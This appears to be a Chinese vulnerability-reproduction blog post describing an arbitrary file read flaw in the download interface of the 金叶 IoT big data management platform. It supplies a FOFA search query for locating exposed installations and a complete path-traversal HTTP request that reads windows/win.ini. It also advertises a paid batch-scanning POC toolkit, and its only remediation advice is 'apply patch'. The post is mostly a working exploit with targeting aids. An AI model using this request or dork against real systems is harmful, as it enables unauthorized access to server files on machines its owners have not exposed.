#  金叶物联网大数据管理平台download接口存在任意文件读取漏洞  附POC  
2026-10-24更新
                    2026-10-24更新  南风漏洞复现文库   2026-10-24 14:50  
  
   
  
#   
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 金叶物联网大数据管理简介  
  
微信公众号搜索：南风漏洞复现文库  
该文章 南风漏洞复现文库 公众号首发  
  
金叶物联网大数据管理平台  
## 2.漏洞描述  
  
金叶物联网大数据管理平台download接口存在任意文件读取漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
金叶物联网大数据管理平台  
![金叶物联网大数据管理平台download接口存在任意文件读取漏洞](https://mmbiz.qpic.cn/sz_mmbiz_png/b9KQYsB8q6xpfEkXwrNicqanZRIMtFeSDmUicepktXdliaIen9GibBnvnYqqBgIlcWXRCV9VPeCicCDyiaGXibyKlH5OwC7RKZawwtO0jMQZ62mgKk/640?wx_fmt=png&from=appmsg "")  
  
金叶物联网大数据管理平台download接口存在任意文件读取漏洞  
## 4.fofa查询语句  
  
title="物联网大数据管理平台"  
## 5.漏洞复现  
  
漏洞链接：http://xx.xx.xx.xx/data/file/download?name=../../../../../../windows/win.ini  
  
漏洞数据包：  
```
GET /data/file/download?name=../../../../../../windows/win.ini HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9KQYsB8q6x2QcELe9hiaZAzBIEibwFNK1tkiacI03aLMJftUJOCCLibxXbH9yqWyjq46nmYg1k0PicqObJEFKt0UYK0ic3gnamDzWRnwicG44Jmm0/640?wx_fmt=jpeg&from=appmsg "")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。  
2: 免登录，免费fofa查询。   
3: 更新其他实用网络安全工具项目。  
4: 免费指纹识别，持续更新指纹库。  
5: Nuclei脚本。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9KQYsB8q6zc743lEJ87w1s0YE3a88n5caQDiauy6u7wB4cH2ybutD8vZ0RyFiaPyFBAqHkqPXHhFrRibtazVS2OFE3vgWUDJLKslOdCyakOT4/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9KQYsB8q6wSQHagJ8tibFuD4TarrD0ia0HGZkNeK5aibyazaBMib5wVpia313cslDLgjUSu3uBbXCNIMWUHtaTJOdichq34oVHNzEPiaicVUI31LIk/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9KQYsB8q6yicAhTUG7nKGibX4BDEWrRiaYCicevVa1LmkfLNU9mC6BsQxfG7XadbDVmn8p0u48h0yYgJbShlibbEQrhdApjWFBAPbqt1ibkSia43I/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9KQYsB8q6zRSekGJXfGpXRlia0e5CrX5wkWP4x5xVDiaLka6egJuGu8lv2qDOLl7kaujzGaxj7ehnnQvOBJ8HJvxM18qwFKStlIQNGMfpUe0/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6xkZvbZKR1Rn7ueWaYzwoia7Fqbfe6XlzaVnZdGg0Od2ibdgDiaRXGJmSttwYddT2OXibOJ1LLvasmr8lkQc4D0jxcN4tCPV1G0mTk/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9KQYsB8q6xmznkI4eG1MNDe2XgaeW2tAiaRG6FP7HpNPbHGe80zgk6qv5TOlt63Lkhc2cjGFMs7PoSAiczDF25IXgN1OGgicI2Cz77C47u6KA/640?wx_fmt=jpeg&from=appmsg "")  
## 7.整改意见  
  
打补丁  
## 8.往期回顾  
  
  
   
  
  
[用友YonBIP execute SpEL存在表达式注入漏洞  附POC](https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247490952&idx=1&sn=cf789a46f8a2796f5293073135be4ba1&scene=21#wechat_redirect)  
  
  
[畅捷通T+ GLSyncService.asmx接口存在任意文件读取漏洞  附POC](https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247490919&idx=1&sn=ec1c38e3dadd2278b6e21a8d50a37d2a&scene=21#wechat_redirect)  
  
  
